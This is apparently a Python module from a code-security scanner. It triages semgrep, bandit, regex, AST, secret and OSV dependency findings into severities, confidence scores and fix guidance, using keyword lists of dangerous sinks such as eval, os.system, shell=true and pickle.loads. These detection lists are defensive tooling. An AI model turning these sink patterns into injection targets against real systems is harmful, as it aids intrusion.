                        "confidence_label": self._confidence_label(boosted_conf),
                        "attention_level": self._attention_level(boosted_conf, flow.exploitability_level),
                        "framework": flow.framework,
                        "route_hint": flow.route_hint,
                        "source_symbol": flow.source_symbol,
                        "sink_symbol": flow.sink_symbol,
                        "exploitability": "reachable",
                        "exploitability_level": flow.exploitability_level,
                        "propagation_depth": flow.propagation_depth,
                        "propagation_chain": flow.propagation_chain or [],
                    }
                )
            )

        return enriched

    @staticmethod
    def _infer_data_source(rule_id: str, message: str, code_snippet: str) -> str:
        key = ScannerService._normalize_issue_text(rule_id, message, code_snippet)
        if any(
            token in key
            for token in [
                "request.",
                "request[",
                "query_params",
                "json()",
                "form",
                "body",
                "params",
                "argv",
                "user input",
                "untrusted",
                "httpcontext.request",
                "request.query",
                "request.form",
                "r.url.query",
                "queryparam(",
                "req.query",
                "req.body",
                "req.params",
                "next",
                "url",
                "term",
                "report_name",
            ]
        ):
            return "user_input"
        if any(token in key for token in ["open(", "read(", "readfile(", "yaml.load", "pickle.load", "pickle.loads"]):
            return "file"
        if any(token in key for token in ["= \"", "= '\"", "hardcoded", "literal", "const "]):
            return "hardcoded"
        return "internal"

    @staticmethod
    def _infer_usage_context(rule_id: str, message: str, code_snippet: str) -> str:
        key = ScannerService._normalize_issue_text(rule_id, message, code_snippet)
        if any(token in key for token in ["yaml.load", "pickle.load", "pickle.loads", "deserialize"]):
            return "parsed"
        if "eval(" in key:
            return "executed"
        if "exec(" in key:
            if any(token in key for token in ["child_process", "require", "execsync"]):
                return "executed"
            return "executed"
        if any(
            token in key
            for token in [
                "os.system",
                "shell=true",
                "subprocess",
                "popen",
                "command",
                "exec.command",
                "process.start",
                "runtime.getruntime().exec",
            ]
        ):
            return "executed"
        if any(
            token in key
            for token in [
                "sql",
                "cursor.execute",
                "select",
                "insert",
                "update",
                "delete",
                "fromsqlraw",
                "executesqlraw",
                "sqlcommand",
                "queryrow",
                "db.query",
                "db.exec",
            ]
        ):
            return "database"
        if any(token in key for token in ["sanitize", "validated", "validator", "regex"]):
            return "validated"
        return "unknown"

    @staticmethod
    def _severity_rank(level: str) -> int:
        normalized = (level or "").upper()
        if normalized == SEVERITY_HIGH:
            return 3
        if normalized == SEVERITY_MEDIUM:
            return 2
        if normalized == SEVERITY_LOW:
            return 1
        if normalized == SEVERITY_INFO:
            return 0
        return 1

    @staticmethod
    def _severity_by_rank(rank: int) -> str:
        if rank >= 3:
            return SEVERITY_HIGH
        if rank == 2:
            return SEVERITY_MEDIUM
        if rank == 1:
            return SEVERITY_LOW
        return SEVERITY_INFO

    @classmethod
    def _cap_severity(cls, current: str, max_level: str) -> str:
        current_rank = cls._severity_rank(current)
        max_rank = cls._severity_rank(max_level)
        return cls._severity_by_rank(min(current_rank, max_rank))

    @staticmethod
    def _confidence_label(score: int) -> str:
        if score >= 80:
            return "HIGH"
        if score >= 60:
            return "MEDIUM"
        return "LOW"

    @staticmethod
    def _attention_level(confidence: int, exploitability_level: str | None = None) -> str:
        level = str(exploitability_level or "").upper()
        if level in {"HIGH", "MEDIUM", "LOW"}:
            return level
        if confidence >= 80:
            return "HIGH"
        if confidence >= 60:
            return "MEDIUM"
        return "LOW"

    @staticmethod
    def _pattern_strength(rule_id: str, category: str) -> str:
        rid = (rule_id or "").lower()
        cat = (category or "").lower()
        if rid.startswith("regex.") and "improvement" in rid:
            return "weak"
        if any(token in cat for token in ["sql injection", "command injection", "hardcoded secrets", "credential in url"]):
            return "exact"
        if rid.startswith("regex.") or rid.startswith("bandit"):
            return "partial"
        if rid.startswith("semgrep"):
            return "exact"
        return "weak"

    @staticmethod
    def _confidence_score(pattern_strength: str, context_validated: bool, file_path: str, evidence: str) -> int:
        if pattern_strength == "exact" and context_validated:
            score = 90
        elif pattern_strength == "exact":
            score = 78
        elif pattern_strength == "partial":
            score = 62
        else:
            score = 42

        path = (file_path or "").lower()
        blob = (evidence or "").lower()
        if any(token in path for token in [".env", "config", "auth"]):
            score += 8
        if any(token in blob for token in ["eval(", "exec(", "os.system", "subprocess", "db.query", "cursor.execute"]):
            score += 7

        return max(0, min(100, score))

    @staticmethod
    def _confidence_reasons(
        *,
        data_source: str,
        pattern_strength: str,
        context_validated: bool,
    ) -> list[str]:
        source_reason = {
            "dependency": "Data source reliability: OSV advisory database correlation.",
            "user_input": "Data source reliability: untrusted input source identified in code path.",
            "file": "Data source reliability: file-derived input source detected.",
            "hardcoded": "Data source reliability: hardcoded value detected directly in source.",
        }.get(str(data_source or "").strip().lower(), "Data source reliability: internal static analysis signal.")

        accuracy_reason = {
            "exact": "Match accuracy: exact vulnerability pattern match.",
            "partial": "Match accuracy: partial pattern match with corroborating context.",
            "weak": "Match accuracy: weak heuristic pattern; requires manual review.",
        }.get(str(pattern_strength or "").strip().lower(), "Match accuracy: heuristic pattern; requires manual review.")

        context_reason = (
            "Match context: sink/source usage validated in execution path."
            if context_validated
            else "Match context: limited execution context evidence available."
        )
        return [source_reason, accuracy_reason, context_reason]

    @staticmethod
    def _policy_severity(
        category: str,
        data_source: str,
        usage_context: str,
        scanner_severity: str,
        evidence_blob: str = "",
        file_path: str = "",
    ) -> str:
        category_name = (category or "").strip()
        normalized_scanner = (scanner_severity or SEVERITY_LOW).upper()
        non_prod_path = ScannerService._is_non_production_code_path(file_path)

        if category_name in ScannerService.IMPROVEMENT_CATEGORY_SEVERITY:
            return ScannerService.IMPROVEMENT_CATEGORY_SEVERITY[category_name]

        if category_name == ScannerService.UNVERIFIED_CATEGORY:
            return SEVERITY_INFO

        if category_name in {"Unsafe YAML Deserialization", "Unsafe Pickle Deserialization"}:
            if data_source == "user_input":
                return SEVERITY_HIGH
            if data_source == "hardcoded":
                return SEVERITY_LOW
            return SEVERITY_MEDIUM

        if category_name in {"Command Injection", "SQL Injection"}:
            if category_name == "Command Injection":
                source_untrusted = data_source == "user_input"
                sink_executed = usage_context == "executed"
                dangerous_construct = ScannerService._looks_like_command_concat_or_shell(evidence_blob)

                if source_untrusted and sink_executed and dangerous_construct:
                    return SEVERITY_MEDIUM if non_prod_path else SEVERITY_HIGH
                if source_untrusted and sink_executed:
                    return SEVERITY_LOW if non_prod_path else SEVERITY_MEDIUM
                if sink_executed:
                    return SEVERITY_LOW
                return SEVERITY_INFO

            # SQL injection: still high only for untrusted source into DB context.
            if data_source == "user_input" and usage_context == "database":
                return SEVERITY_MEDIUM if non_prod_path else SEVERITY_HIGH
            if usage_context == "database":
                return SEVERITY_LOW
            return SEVERITY_LOW

        if category_name == "Dynamic Code Execution (eval/exec)":
            if data_source == "user_input" or usage_context == "executed":
                return SEVERITY_MEDIUM if non_prod_path else SEVERITY_HIGH
            return SEVERITY_MEDIUM

        if category_name == "Hardcoded Secrets":
            if any(token in normalized_scanner for token in [SEVERITY_HIGH, "CRITICAL"]):
                return SEVERITY_HIGH
            return SEVERITY_MEDIUM

        if category_name == "Credential in URL":
            return SEVERITY_HIGH

        if category_name == "Insecure CORS Configuration":
            return SEVERITY_MEDIUM

        if category_name == "Weak Random Generator Usage":
            return SEVERITY_LOW

        if category_name == "Exception Detail Exposure":
            return SEVERITY_MEDIUM

        if category_name == "Insecure HTTP Usage":
            if any(token in (usage_context or "") for token in ["executed", "database"]):
                return SEVERITY_MEDIUM
            return SEVERITY_LOW

        if category_name == "Flask Debug Mode Enabled":
            if normalized_scanner == SEVERITY_HIGH:
                return SEVERITY_MEDIUM
            return SEVERITY_LOW

        if category_name == "Unescaped HTML in Template (Potential XSS)":
            if data_source == "user_input":
                return SEVERITY_MEDIUM
            return SEVERITY_LOW

        if category_name == "Weak Input Validation":
            if data_source == "user_input" and usage_context in {"executed", "database", "parsed"}:
                return SEVERITY_MEDIUM if non_prod_path else SEVERITY_HIGH
            if data_source == "user_input":
                return SEVERITY_LOW if non_prod_path else SEVERITY_MEDIUM
            return SEVERITY_LOW

        return normalized_scanner if normalized_scanner in {SEVERITY_HIGH, SEVERITY_MEDIUM, SEVERITY_LOW, SEVERITY_INFO} else SEVERITY_LOW

    def _finalize_issue(
        self,
        *,
        scanner: str,
        rule_id: str,
        scanner_title: str,
        scanner_severity: str,
        file_path: str,
        line: int,
        message: str,
        code_snippet: str,
    ) -> SecurityIssue:
        category = self._classify_category(rule_id, scanner_title, message, code_snippet)
        if category == self.UNVERIFIED_CATEGORY:
            data_source = "internal"
            usage_context = "unknown"
        else:
            data_source = self._infer_data_source(rule_id, message, code_snippet)
            usage_context = self._infer_usage_context(rule_id, message, code_snippet)
        evidence = code_snippet.strip() if code_snippet else message
        severity = self._policy_severity(
            category,
            data_source,
            usage_context,
            scanner_severity,
            evidence_blob=evidence,
            file_path=file_path,
        )

        if severity not in {SEVERITY_HIGH, SEVERITY_MEDIUM, SEVERITY_LOW, SEVERITY_INFO}:
            severity = SEVERITY_LOW

        title = f"[{severity}] {category}"
        pattern_strength = self._pattern_strength(rule_id, category)
        context_validated = usage_context in {"executed", "database", "parsed", "validated"}
        confidence = self._confidence_score(pattern_strength, context_validated, file_path, evidence)
        if category == self.UNVERIFIED_CATEGORY:
            confidence = min(confidence, 35)
        poc_payload, poc_command, poc_snippet = self._code_poc(category)
        fix_description = self._fix_guidance_for_category(category)

        return SecurityIssue(
            title=title,
            severity=severity,
            finding_type="code_vuln",
            file=file_path,
            line=max(1, int(line)),
            snippet=evidence,
            scanner=scanner,
            rule_id=rule_id,
            message=message,
            fix_description=fix_description,
            fix_code=None,
            category=category,
            data_source=data_source,
            usage_context=usage_context,
            evidence=evidence,
            confidence=confidence,
            confidence_label=self._confidence_label(confidence),
            confidence_reasons=self._confidence_reasons(
                data_source=data_source,
                pattern_strength=pattern_strength,
                context_validated=context_validated,
            ),
            attention_level=self._attention_level(confidence),
            poc_payload=poc_payload,
            poc_command=poc_command,
            poc_snippet=poc_snippet,
            guidance=self._default_guidance(),
        )

    def _dependency_issue(self, finding: dict) -> SecurityIssue:
        severity = str(finding.get("severity") or SEVERITY_MEDIUM).upper()
        if severity == "CRITICAL":
            severity = SEVERITY_HIGH
        if severity not in {SEVERITY_HIGH, SEVERITY_MEDIUM, SEVERITY_LOW, SEVERITY_INFO}:
            severity = SEVERITY_MEDIUM

        package = str(finding.get("package") or "unknown")
        version = str(finding.get("version") or "unknown")
        cve = str(finding.get("cve") or "OSV-UNKNOWN")
        issue = str(finding.get("issue") or "Known vulnerable dependency detected")
        fix = str(finding.get("fix") or "Upgrade to a patched version")
        fix_version = str(finding.get("fix_version") or "").strip() or None
        manifest_path = str(finding.get("manifest_path") or "dependency-manifest")
        line = max(1, int(finding.get("line") or 1))
        default_confidence = {
            SEVERITY_HIGH: 92,
            SEVERITY_MEDIUM: 78,
            SEVERITY_LOW: 64,
            SEVERITY_INFO: 52,
        }.get(severity, 70)
        confidence = int(finding.get("confidence") or default_confidence)
        confidence = max(0, min(100, confidence))
        confidence_reasons = [
            str(item).strip() for item in (finding.get("confidence_reasons") or []) if str(item).strip()
        ]
        if not confidence_reasons:
            confidence_reasons = [
                "Data source reliability: OSV advisory database correlation.",
                "Match accuracy: exact package name and installed version correlation.",
            ]
        exploitability_level = str(finding.get("exploitability_level") or "").strip().upper() or {
            SEVERITY_HIGH: "HIGH",
            SEVERITY_MEDIUM: "MEDIUM",
            SEVERITY_LOW: "LOW",
            SEVERITY_INFO: "LOW",
        }.get(severity, "MEDIUM")
        network_access = bool(finding.get("network_access"))
        auth_required = bool(finding.get("auth_required", True))
        exploitability = "LOCAL_ONLY"
        if network_access and not auth_required:
            exploitability = "REMOTE"
        elif network_access:
            exploitability = "AUTHENTICATED"

        exploitability_score = int(finding.get("exploitability_score") or 0)
        exploitability_confidence = min(1.0, max(0.0, exploitability_score / 9.0))
        reasons = [str(item).strip() for item in (finding.get("exploitability_reasons") or []) if str(item).strip()]
        non_prod_path = self._is_non_production_manifest_path(manifest_path)

        if non_prod_path:
            severity = SEVERITY_INFO
            confidence = min(confidence, 60)
            exploitability_level = "LOW"
            issue = f"{issue} (non-production dependency path)"

        guidance_confidence = {
            "HIGH": "High",
            "MEDIUM": "Medium",
            "LOW": "Low",
        }.get(self._confidence_label(confidence), "Medium")
        exact_fix = ""
        if fix_version:
            if str(finding.get("ecosystem") or "").strip().lower() == "npm":
                exact_fix = f"npm install {package}@{fix_version}"
            else:
                exact_fix = f"Upgrade {package} to {fix_version}"

        issue_text = str(issue or "").strip()
        normalized_issue = issue_text.rstrip(".")
        if not normalized_issue or normalized_issue.lower() == "known vulnerable dependency detected":
            normalized_issue = "Dependency Vulnerability"

        impact_summary = str(finding.get("impact_label") or "").strip() or "Unknown"
        impact_code = str(finding.get("impact_category") or "Unknown").strip() or "Unknown"

        if reasons and "Public exploit available" in reasons and "No authentication required" in reasons and "Network accessible" in reasons:
            impact_summary = "Remote Code Execution (RCE)"

        finding_title = normalized_issue

        danger_text = issue
        if cve and cve != "OSV-UNKNOWN" and cve not in danger_text:
            danger_text = f"{danger_text} ({cve})"

        poc_payload, poc_command, poc_snippet = self._dependency_poc(normalized_issue, package)
        safe_version_display = fix_version or "unknown"
        fix_command = exact_fix or "No verified fixed version available from advisory data."
        poc_block = "No verified PoC template available for this advisory."
        if poc_payload:
            poc_block = poc_payload
        elif poc_command:
            poc_block = poc_command
        elif poc_snippet:
            poc_block = poc_snippet
        cli_output = (
            f"🚨 {severity}: {finding_title}\n\n"
            f"Package: {package} ({version})\n"
            f"Installed: {version}\n"
            f"Safe: {safe_version_display}\n\n"
            f"Exploitability: {exploitability_level}\n"
            f"Impact: {impact_code}\n"
            f"Confidence: {confidence}%\n\n"
            "Fix:\n"
            f"{fix_command}\n\n"
            "PoC:\n"
            f"{poc_block}"
        )
        api_output = {
            "package": package,
            "severity": severity,
            "exploitability": exploitability_level,
            "impact": impact_code,
            "confidence": str(confidence),
            "fix": fix_command,
        }

        return SecurityIssue(
            title=f"[{severity}] {finding_title}",
            severity=severity,
            finding_type="dependency_vuln",
            file=manifest_path,
            line=line,
            snippet=f"{package}@{version}",
            scanner="osv",
            rule_id=f"osv.{cve.lower()}",
            message=normalized_issue,
            fix_description=fix,
            fix_code=exact_fix or None,
            category="Dependency Vulnerability",
            data_source="dependency",
            usage_context="package",
            evidence=f"{package}@{version}",
            confidence=confidence,
            confidence_label=self._confidence_label(confidence),
            confidence_reasons=confidence_reasons[:5],
            attention_level=self._attention_level(confidence, exploitability_level),
            package=package,
            package_version=version,
            cve=cve,
            fix_version=fix_version,
            exploitability=exploitability,
            exploitability_confidence=exploitability_confidence,
            exploitability_level=exploitability_level,
            impact_summary=impact_summary,
            impact_code=impact_code,
            fix_command=fix_command,
            cli_output=cli_output,
            api_output=api_output,
            exploit_scenario=reasons[:5],
            poc_payload=poc_payload,
            poc_command=poc_command,
            poc_snippet=poc_snippet,
            guidance=AIGuidance(
                explanation=f"Verified OSV advisory for {package}@{version}.",
                danger=danger_text,
                real_world_example=impact_summary,
                exact_fix=exact_fix,
                confidence=guidance_confidence,
                guidance_type="template-only",
                fallback_reason="verified-external-db",
            ),
        )

    @staticmethod
    def _is_non_production_manifest_path(manifest_path: str) -> bool:
        normalized = str(manifest_path or "").replace("\\", "/").strip().lower()
        if not normalized:
            return False

        segments = [segment for segment in normalized.split("/") if segment]
        non_prod_markers = {
            "example",
            "examples",
            "demo",
            "demos",
            "sample",
            "samples",
            "test",
            "tests",
            "spec",
            "specs",
            "doc",
            "docs",
            "benchmark",
            "benchmarks",
        }
        return any(segment in non_prod_markers for segment in segments)

    def run_dependency_scan(self, repo_dir: Path) -> List[SecurityIssue]:
        issues: List[SecurityIssue] = []
        findings = self.dependency_scanner.scan(repo_dir)
        for finding in findings:
            issue = self._dependency_issue(finding)
            if self._is_node_manifest_path(issue.file) or str(issue.file or "").lower().endswith(
                ("requirements.txt", "pipfile", "pyproject.toml", "setup.py", "setup.cfg")
            ):
                issues.append(issue)

        if self.dependency_scanner.last_truncated_count > 0:
            total = self.dependency_scanner.last_dependency_total
            scanned = total - self.dependency_scanner.last_truncated_count
            issues.append(
                SecurityIssue(
                    title="[INFO] Dependency Scan Coverage Limited",
                    severity=SEVERITY_INFO,
                    finding_type="dependency_notice",
                    file="dependency-manifests",
                    line=1,
                    snippet=f"scanned={scanned} total={total}",
                    scanner="dependency_scanner",
                    rule_id="dependency.limit_reached",
                    message=(
                        f"Dependency scanning was capped at {scanned} of {total} dependencies. "
                        "Increase OSV_MAX_DEPENDENCIES for full coverage."
                    ),
                    fix_description="Increase OSV_MAX_DEPENDENCIES and rerun the scan.",
                    fix_code=None,
                    category="Scan Coverage",
                    data_source="internal",
                    usage_context="scanner",
                    evidence=f"osv_max_dependencies={scanned}",
                    confidence=95,
                    confidence_label="HIGH",
                    confidence_reasons=["Scanner emitted explicit coverage cap metadata."],
                    attention_level="LOW",
                    exploitability="UNKNOWN",
                    guidance=AIGuidance(
                        explanation="Dependency advisory checks were intentionally limited by configured scanner cap.",
                        danger="Partial coverage can hide vulnerable packages in large repositories.",
                        real_world_example="A vulnerable package beyond the cap would not be reported in this scan.",
                        exact_fix="Set OSV_MAX_DEPENDENCIES to a higher value and rerun dependency scan.",
                        confidence="High",
                        guidance_type="template-only",
                        fallback_reason="coverage-cap-enforced",
                    ),
                )
            )
        return issues

    def _secret_issue(self, finding: dict) -> SecurityIssue:
        severity = str(finding.get("severity") or SEVERITY_HIGH).upper()
        if severity not in {"CRITICAL", SEVERITY_HIGH, SEVERITY_MEDIUM, SEVERITY_LOW, SEVERITY_INFO}:
            severity = SEVERITY_HIGH

        name = str(finding.get("name") or "Potential Secret").strip() or "Potential Secret"
        file_path = str(finding.get("file") or "unknown").strip() or "unknown"
        line = max(1, int(finding.get("line") or 1))
        snippet = str(finding.get("snippet") or "").strip()
        fix = str(finding.get("fix") or "Move this value to an environment variable and rotate/revoke this credential.").strip()
        message = f"{name} detected. {fix}"

        return SecurityIssue(
            title=f"[{severity}] Hardcoded Secrets",
            severity=severity,
            finding_type="secret",
            file=file_path,
            line=line,
            snippet=snippet,
            scanner="secret_scanner",
            rule_id=f"secret.{name.lower().replace(' ', '_')}",
            message=message,
            fix_description=fix,
            fix_code=None,
            category="Hardcoded Secrets",
            data_source="internal",
            usage_context="unknown",
            evidence=snippet,
            confidence=95 if severity in {"CRITICAL", SEVERITY_HIGH} else 85,
            confidence_label="HIGH",
            confidence_reasons=[
                "Pattern-based secret detection matched known credential format.",
            ],
            attention_level="HIGH" if severity in {"CRITICAL", SEVERITY_HIGH} else "MEDIUM",
            exploitability="UNKNOWN",
            guidance=AIGuidance(
                explanation="A credential-like value appears to be committed in source.",
                danger="Exposed credentials can lead to unauthorized access and account compromise.",
                real_world_example="Leaked API keys are often harvested quickly from source repositories.",
                exact_fix=fix,
                confidence="High",
                guidance_type="template-only",
                fallback_reason="secret-pattern-match",
            ),
        )

    def run_secret_scan(self, repo_dir: Path) -> List[SecurityIssue]:
        issues: List[SecurityIssue] = []
        findings = scan_secrets(repo_dir)
        for finding in findings:
            issue = self._secret_issue(finding)
            if self._should_emit_issue(issue):
                issues.append(issue)
        return issues

    def run_semgrep(self, repo_dir: Path, strict_mode: bool = False) -> List[SecurityIssue]:
        command = [
            self.semgrep_executable,
            "--config", "p/python",
            "--config", "p/nodejs",
            "--config", "p/flask",
            "--config", "p/django",
            "--config", "p/express",
            "--config", "p/owasp-top-ten",
            "--severity", "WARNING",
            "--severity", "ERROR",
            "--json",
            "--include",
            "*.js",
            "--include",
            "*.jsx",
            "--include",
            "*.ts",
            "--include",
            "*.tsx",
            "--include",
            "*.mjs",
            "--include",
            "*.cjs",
            str(repo_dir),
        ]
        data = self._run_command(command, timeout_seconds=self.semgrep_timeout_seconds)

        issues: List[SecurityIssue] = []
        for finding in data.get("results", []):
            start = finding.get("start", {})
            check_id = finding.get("check_id", "semgrep.rule")
            message = finding.get("message", "Security issue detected")
            severity = normalize_semgrep_severity(finding.get("severity", "LOW"))
            title = check_id.split(".")[-1].replace("-", " ").title()
            code_snippet = str((finding.get("extra") or {}).get("lines", "")).strip()

            finalized = self._finalize_issue(
                scanner="semgrep",
                rule_id=check_id,
                scanner_title=title,
                scanner_severity=severity,
                file_path=self._normalize_file_path(finding.get("path", "unknown"), repo_dir),
                line=int(start.get("line", 1)),
                message=message,
                code_snippet=code_snippet,
            )
            if not self._is_node_source_path(finalized.file):
                continue
            if self._should_emit_issue(finalized, strict_mode=strict_mode):
                issues.append(finalized)

        return issues

    def run_bandit(self, repo_dir: Path, strict_mode: bool = False) -> List[SecurityIssue]:
        command_variants = [
            ["bandit", "-r", str(repo_dir), "-f", "json", "-q"],
            [sys.executable, "-m", "bandit", "-r", str(repo_dir), "-f", "json", "-q"],
        ]

        data: dict | None = None
        last_dependency_error: Exception | None = None
        for command in command_variants:
            try:
                # Bandit returns exit code 1 when findings are present; treat that as a valid scan result.
                data = self._run_command(command, timeout_seconds=self.bandit_timeout_seconds, ok_returncodes=(0, 1))
                break
            except ScannerDependencyError as exc:
                last_dependency_error = exc
                continue

        if data is None:
            if last_dependency_error is not None:
                raise ScannerDependencyError(
                    "Bandit is unavailable in PATH and Python module lookup"
                ) from last_dependency_error
            raise ScannerDependencyError("Bandit is unavailable")

        issues: List[SecurityIssue] = []
        # Filenames that indicate non-production / test code.  Checked as substrings
        # of the lowercased, forward-slash-normalised path.
        _NONPROD_NAME_TOKENS = (
            "/tests/", "/test/", "test_", "_test", "conftest",
            "/fixtures/", "fixture", "/data/", "/scripts/",
            "generate", "dataset", "seed", "mock", "sample", "factory",
        )
        # Bandit rules that are only noise in non-production files.
        #   B101 – assert_used: assert is correct in tests; only a concern in prod
        #          (Python -O strips asserts).  Never suppress in production files.
        #   B311 – random: non-crypto RNG acceptable in data-gen / seed scripts.
        #   B322 – input() usage (Python 2): irrelevant in test scaffolding.
        #   B330 – xml.etree.cElementTree: test-only XML parsing is low risk.
        # Real dangerous calls (B602/B604 subprocess shell, B307 eval, etc.) are
        # NOT in this set and will always fire regardless of file location.
        _NOISE_BANDIT_RULES = {"B101", "B311", "B322", "B330"}
        for finding in data.get("results", []):
            test_id = finding.get("test_id", "bandit.rule")
            _fname = str(finding.get("filename", "")).lower().replace("\\", "/")
            if test_id in _NOISE_BANDIT_RULES and any(tok in _fname for tok in _NONPROD_NAME_TOKENS):
                continue
            message = finding.get("issue_text", "Security issue detected")
            severity = normalize_bandit_severity(finding.get("severity", "LOW"))
            title = finding.get("test_name", test_id)
            code_snippet = str(finding.get("code", "")).strip()

            finalized = self._finalize_issue(
                scanner="bandit",
                rule_id=test_id,
                scanner_title=title,
                scanner_severity=severity,
                file_path=self._normalize_file_path(finding.get("filename", "unknown"), repo_dir),
                line=int(finding.get("line_number", 1)),
                message=message,
                code_snippet=code_snippet,
            )
            if self._should_emit_issue(finalized, strict_mode=strict_mode):
                issues.append(finalized)

        return issues

    def run_ast_scan(self, repo_dir: Path, strict_mode: bool = False) -> List[SecurityIssue]:
        issues: List[SecurityIssue] = []
        source_exts = {".py", ".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs"}

        for file_path in repo_dir.rglob("*"):
            if not file_path.is_file():
                continue
            if is_excluded_path(file_path, repo_dir):
                continue
            if file_path.suffix.lower() not in source_exts:
                continue

            try:
                content = file_path.read_text(encoding="utf-8", errors="ignore")
            except OSError:
                continue

            ast_findings = hybrid_analyze_file(file_path, content)
            for finding in ast_findings:
                snippet = str(finding.get("snippet") or "").strip()
                finalized = self._finalize_issue(
                    scanner="ast_scanner",
                    rule_id=f"ast.{finding.get('type', 'unknown')}",
                    scanner_title=str(finding.get("name") or "Security issue"),
                    scanner_severity=str(finding.get("severity") or "HIGH").upper(),
                    file_path=self._normalize_file_path(str(file_path), repo_dir),
                    line=max(1, int(finding.get("line") or 1)),
                    message=str(finding.get("name") or "Security issue"),
                    code_snippet=snippet,
                )
                # Write fix_code directly - this is what the auto-fix branch uses
                fix_text = str(finding.get("fix") or "").strip()
                if fix_text:
                    finalized.fix_code = fix_text
                    finalized.guidance.exact_fix = fix_text
                if self._should_emit_issue(finalized, strict_mode=strict_mode):
                    issues.append(finalized)

        return issues

    def scan_repository(self, repo_dir: Path, strict_mode: bool = False, quick_mode: bool = False) -> List[SecurityIssue]:
        issues: List[SecurityIssue] = []
        has_node = self._is_node_repository(repo_dir)
        has_python = self._has_python_files(repo_dir)
        if not has_node and not has_python:
            raise ScannerServiceError("Only Node.js repositories are supported")

        taint_flows = self.taint_service.scan_repository(repo_dir)
        self.last_files_scanned = 0
        self.last_patterns_checked = 0
        self.last_analyzer_capabilities = {
            "dependency_scanner": False,
            "rule_engine": False,
            "taint_service": True,
            "semgrep": False,
            "bandit": False,
        }
        self.last_detected_frameworks = self._detect_frameworks_from_repo(repo_dir, taint_flows)

        # Dependency scan uses verified external database entries.
        issues.extend(self.run_dependency_scan(repo_dir))
        self.last_analyzer_capabilities["dependency_scanner"] = True

        secret_findings = self.run_secret_scan(repo_dir)
        issues.extend(secret_findings)

        # Always run cheap deterministic rules first for baseline coverage.
        rule_result = self.rule_engine.scan_repository(repo_dir)
        self.last_analyzer_capabilities["rule_engine"] = True
        self.last_files_scanned = rule_result.files_scanned
        self.last_patterns_checked = rule_result.patterns_checked
        for match in rule_result.matches:
            is_node = self._is_node_source_path(match.file_path)
            is_python = match.file_path.endswith(".py")
            if not is_node and not is_python:
                continue
            if not self._is_valid_match(match.rule_id, match.snippet):
                continue
            finalized = self._finalize_issue(
                scanner="regex",
                rule_id=match.rule_id,
                scanner_title=match.name,
                scanner_severity=match.severity,
                file_path=match.file_path,
                line=match.line,
                message=match.message,
                code_snippet=match.snippet,
            )
            if self._should_emit_issue(finalized, strict_mode=strict_mode):
                issues.append(finalized)

        issues.extend(self.run_ast_scan(repo_dir, strict_mode=strict_mode))

        if not quick_mode:
            semgrep_available = True
            try:
                issues.extend(self.run_semgrep(repo_dir, strict_mode=strict_mode))
                self.last_analyzer_capabilities["semgrep"] = True
            except ScannerDependencyError:
                semgrep_available = False
            except ScannerServiceError:
                # Large repositories can exceed semgrep limits; keep partial results
                # from dependency/rule/taint analyzers instead of failing the scan.
                self.last_analyzer_capabilities["semgrep"] = False

            if not semgrep_available:
                # Keep scans usable with deterministic engines when Semgrep is unavailable.
                self.last_analyzer_capabilities["semgrep"] = False

            # Run Bandit for Python repositories
            if self._has_python_files(repo_dir):
                try:
                    bandit_issues = self.run_bandit(repo_dir, strict_mode=strict_mode)
                    issues.extend(bandit_issues)
                    self.last_analyzer_capabilities["bandit"] = True
                except ScannerDependencyError:
                    self.last_analyzer_capabilities["bandit"] = False
                except ScannerServiceError:
                    self.last_analyzer_capabilities["bandit"] = False
        else:
            self.last_analyzer_capabilities["semgrep"] = False
            self.last_analyzer_capabilities["bandit"] = False

        issues = self._apply_taint_context(issues, taint_flows)
        # Cross-scanner dedup: when multiple scanners flag the same (file, line, category),
        # keep the highest-confidence finding.  Same-scanner findings are kept as-is so
        # that different rule IDs on the same line are not collapsed.
        from collections import defaultdict as _defaultdict
        _by_loc: dict[tuple, list] = _defaultdict(list)
        for _iss in issues:
            _by_loc[(_iss.file, _iss.line, _iss.category)].append(_iss)
        _deduped: list[SecurityIssue] = []
        for _group in _by_loc.values():
            if len({_i.scanner for _i in _group}) == 1:
                _deduped.extend(_group)
            else:
                _deduped.append(max(_group, key=lambda _i: _i.confidence))
        issues = _deduped
        if quick_mode:
            return issues[: min(80, self.max_findings)]
        return issues[: self.max_findings]

    @staticmethod
    def calculate_risk_score(issues: List[SecurityIssue]) -> int:
        counts: Dict[str, int] = {
            SEVERITY_CRITICAL: 0,
            SEVERITY_HIGH: 0,
            SEVERITY_MEDIUM: 0,
            SEVERITY_LOW: 0,
            SEVERITY_INFO: 0,
        }

        for issue in issues:
            severity = issue.severity.upper()
            if severity in counts:
                counts[severity] += 1
            else:
                counts[SEVERITY_LOW] += 1

        return compute_risk_score(counts)
